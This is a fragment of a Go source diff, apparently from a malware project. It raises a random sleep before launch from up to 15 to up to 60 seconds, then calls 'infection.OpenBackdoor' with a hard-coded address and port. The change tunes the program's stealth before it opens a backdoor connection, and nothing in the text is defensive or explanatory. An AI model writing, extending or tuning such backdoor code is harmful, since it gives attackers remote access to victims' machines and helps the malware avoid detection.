@@ -66,7 +66,7 @@ func randomNumber(max int) int {
 }
 
 func main() {
-	x := randomNumber(15)
+	x := randomNumber(60)
 	time.Sleep(time.Duration(x) * time.Second)
 		
 	go infection.OpenBackdoor("10.0.2.15:8000")
